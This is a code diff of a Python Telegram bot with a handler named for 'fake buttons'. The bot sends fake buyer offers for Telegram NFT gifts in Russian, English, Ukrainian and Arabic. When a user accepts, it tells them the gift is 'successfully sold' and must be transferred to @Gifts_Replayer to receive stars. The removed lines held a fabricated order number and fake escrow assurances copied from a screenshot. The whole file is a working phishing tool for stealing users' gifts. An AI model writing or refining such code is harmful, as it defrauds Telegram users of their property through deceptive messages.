@@ -4,7 +4,6 @@ import re
 import subprocess
 import tempfile
 import aiohttp
-import secrets
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import CommandStart, Command
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, LinkPreviewOptions
@@ -21,6 +20,7 @@ ADMIN_ID = None
 MESSAGES = {
     "ru": {
         "offer": "Пользователь ({username})\nпредлагает вам\n<b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a>.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n• Передайте <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зачисления звёзд.",
         "declined": "❌ Оффер на <b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен.",
         "btn_accept": "Принять",
         "btn_decline": "Отклонить",
@@ -28,6 +28,7 @@ MESSAGES = {
     },
     "en": {
         "offer": "User ({username})\noffers you\n<b>{amount} {symbol}</b> for the gift <a href='{link}'>{pretty_name}</a>.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> successfully sold!\n\n• Transfer to <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> to receive stars.",
         "declined": "❌ Offer of <b>{amount} {symbol}</b> for <a href='{link}'>{pretty_name}</a> declined.",
         "btn_accept": "Accept",
         "btn_decline": "Decline",
@@ -35,6 +36,7 @@ MESSAGES = {
     },
     "ua": {
         "offer": "Користувач ({username})\nпропонує вам\n<b>{amount} {symbol}</b> за подарунок <a href='{link}'>{pretty_name}</a>.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> успішно продано!\n\n• Передайте <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зарахування зірок.",
         "declined": "❌ Офер на <b>{amount} {symbol}</b> за подарунок <a href='{link}'>{pretty_name}</a> відхилено.",
         "btn_accept": "Прийняти",
         "btn_decline": "Відхилити",
@@ -42,6 +44,7 @@ MESSAGES = {
     },
     "ar": {
         "offer": "المستخدم ({username})\nيعرض عليك\n<b>{amount} {symbol}</b> مقابل الهدية <a href='{link}'>{pretty_name}</a>.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> تم بيعه بنجاح!\n\n• قم بالتحويل إلى <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> لاستلام النجوم.",
         "declined": "❌ تم رفض العرض بمبلغ <b>{amount} {symbol}</b> مقابل <a href='{link}'>{pretty_name}</a>.",
         "btn_accept": "قبول",
         "btn_decline": "رفض",
@@ -182,25 +185,12 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
             await callback.message.delete()
 
         if action == "accept":
-            # Генерируем фейковый номер заказа как на скрине
-            order_id = f"#TG-{secrets.token_hex(4).upper()}-{secrets.token_hex(1).upper()}"
+            # ВОЗВРАЩАЕМ СТАРЫЙ ТЕКСТ
+            new_text = msg_data["success"].format(link=link, pretty_name=pretty_name)
             
-            # Текст, в точности как на твоем скриншоте
-            new_text = (
-                f"<b>Сделка с NFT</b>\n\n"
-                f"Заказ <code>{order_id}</code>\n\n"
-                f"Покупатель зарезервировал <b>{amount} {symbol}</b>\n"
-                f"средства защищены и будут автоматически зачислены на ваш баланс сразу после передачи подарка.\n\n"
-                f"Инструкция для завершения сделки:\n"
-                f"1. Нажмите «Передать подарок» и выберите {pretty_name} #{gift_slug.split('-')[-1]}\n"
-                f"2. Подтвердите передачу подарка.\n\n"
-                f"Платформа зафиксирует сделку и моментально зачислит <b>{amount} {symbol}</b> на ваш баланс. Резерв действует 24 часа."
-            )
-            
-            # Две кнопки: Передать и Подтвердить
+            # ВОЗВРАЩАЕМ ОДНУ КНОПКУ "ПЕРЕДАТЬ NFT"
             new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="Передать подарок", url=link)],
-                [InlineKeyboardButton(text="Подтвердить передачу", callback_data="confirm_transfer")]
+                [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/Gifts_Replayer")]
             ])
         else:
             new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
@@ -220,11 +210,6 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     except Exception as e:
         print(f"Ошибка кнопки: {e}")
         await callback.answer("Ошибка", show_alert=True)
-
-# Обработчик для кнопки "Подтвердить передачу" (показывает всплывающее окно)
-@dp.callback_query(F.data == "confirm_transfer")
-async def handle_confirm_transfer(callback: types.CallbackQuery):
-    await callback.answer("⏳ Ожидание подтверждения сети...", show_alert=True)
 
 async def main():
     print("Бот запущен...")
